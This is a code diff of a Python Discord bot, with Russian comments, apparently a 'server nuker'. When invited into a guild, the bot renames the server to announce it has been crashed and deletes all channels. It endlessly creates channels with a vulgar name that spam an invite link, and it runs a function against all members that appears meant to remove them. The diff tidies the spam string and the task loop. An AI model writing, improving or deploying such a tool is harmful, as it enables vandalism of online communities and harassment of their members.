@@ -15,7 +15,7 @@ from discord.ext import commands
 
 from config import settings
 
-
+spam = 'Вас трахнули' 
 link = settings['invite_link']
 bot = commands.Bot(command_prefix=settings['prefix'])
 
@@ -32,27 +32,24 @@ async def on_ready():
 async def on_guild_join(server):
     await server.edit(name=f"Сервер крашнут {bot.user.name}")
     loop = asyncio.get_event_loop()
-    tasks = [
-        loop.create_task(delete_channels(server.channels)),
-        loop.create_task(create_trash_channels(server)),
-        loop.create_task(kill_fucking_all_of_them(bot.get_all_members()))
-    ]
-    loop.run_until_complete(asyncio.wait(tasks))
-    loop.close()
+    loop.create_task(delete_channels(server.channels)),
+    loop.create_task(create_trash_channels(server)),
+    loop.create_task(kill_fucking_all_of_them(bot.get_all_members()))
+    loop.run_forever()
 # Здесь я создал таски, которые выполняются вместе в одно время.
 # Асинхронность - наше все. Люблю её.
 
 # Даже ребёнок поймет, что это.
 async def delete_channels(channels):
     for channel in channels:
-        if str(channel.name) == "Вас трахнули":
+        if str(channel.name) == spam:
             continue
         await channel.delete()
 
 # Даже ребёнок поймет, что это 2
 async def create_trash_channels(server):
     while True:
-        channel = await server.create_text_channel("Вас трахнули.", overwrite=None)
+        channel = await server.create_text_channel(spam, overwrite=None)
         await channel.send(link)
 
 # Даже ребёнок поймет, что это 3
